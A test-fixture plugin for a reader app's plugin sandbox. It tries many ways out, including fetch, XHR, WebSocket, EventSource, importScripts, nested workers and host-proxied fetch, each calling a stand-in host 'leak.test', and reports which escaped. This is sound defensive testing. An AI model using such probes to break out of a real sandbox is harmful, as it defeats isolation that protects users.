/* reader-plugin
{
	"id": "leaky",
	"name": "Leaky",
	"version": "1.0.0",
	"description": "Test plugin: tries every way out of the sandbox and reports what happened.",
	"permissions": ["network"]
}
*/
// A test fixture that pokes at APIs on purpose — not worth typing
// eslint-disable-next-line @typescript-eslint/ban-ts-comment
// @ts-nocheck

// A block keeps these names out of the global scope TypeScript shares with other plugin files
{
	const api = globalThis.reader;
	const LEAK = 'https://leak.test';

	/** Each check resolves "ESCAPED" if it got out, or throws / returns why it didn't. */
	const checks = {
		document: () => (typeof document === 'undefined' ? 'absent' : 'ESCAPED'),
		webrtc: () => (typeof RTCPeerConnection === 'undefined' ? 'absent' : 'ESCAPED'),
		sendBeacon: () => (typeof navigator.sendBeacon === 'undefined' ? 'absent' : 'ESCAPED'),
		fetch: async () => {
			await fetch(`${LEAK}/fetch`);
			return 'ESCAPED';
		},
		xhr: () =>
			new Promise((resolve, reject) => {
				const xhr = new XMLHttpRequest();
				xhr.open('GET', `${LEAK}/xhr`);
				xhr.onload = () => resolve('ESCAPED');
				xhr.onerror = () => reject(new Error('error'));
				xhr.send();
			}),
		websocket: () =>
			new Promise((resolve, reject) => {
				const ws = new WebSocket('wss://leak.test/ws');
				ws.onopen = () => resolve('ESCAPED');
				ws.onerror = () => reject(new Error('error'));
			}),
		eventSource: () =>
			new Promise((resolve, reject) => {
				const es = new EventSource(`${LEAK}/sse`);
				es.onopen = () => resolve('ESCAPED');
				es.onerror = () => reject(new Error('error'));
			}),
		importScripts: () => {
			importScripts(`${LEAK}/script.js`);
			return 'ESCAPED';
		},
		indexedDB: () =>
			new Promise((resolve, reject) => {
				const req = indexedDB.open('bookreader');
				req.onsuccess = () => resolve('ESCAPED');
				req.onerror = () => reject(new Error('error'));
			}),
		nestedWorker: () =>
			new Promise((resolve) => {
				const code = `fetch('${LEAK}/nested').then(() => postMessage('ESCAPED'), () => postMessage('blocked'))`;
				const worker = new Worker(URL.createObjectURL(new Blob([code])));
				worker.onmessage = (e) => resolve(e.data);
				worker.onerror = () => resolve('blocked');
			}),
		hostFetch: async () => {
			await api.net.fetch(`${LEAK}/through-host`);
			return 'ESCAPED';
		},
		markersWithoutPermission: async () => {
			await api.markers.set([{ id: 'x', label: 'x', hue: 0, chapter: 0, fraction: 0 }]);
			return 'ESCAPED';
		}
	};

	const timeout = (ms) => new Promise((resolve) => setTimeout(() => resolve('no answer'), ms));

	async function run() {
		const lines = [];
		for (const [name, check] of Object.entries(checks)) {
			let outcome;
			try {
				outcome = await Promise.race([Promise.resolve().then(check), timeout(3000)]);
			} catch (e) {
				outcome = `blocked (${e?.code || e?.name || e})`;
			}
			lines.push({ type: 'text', text: `${name}: ${outcome}` });
		}
		lines.push({ type: 'text', text: 'done' });
		await api.ui.set(lines);
	}

	run();
}
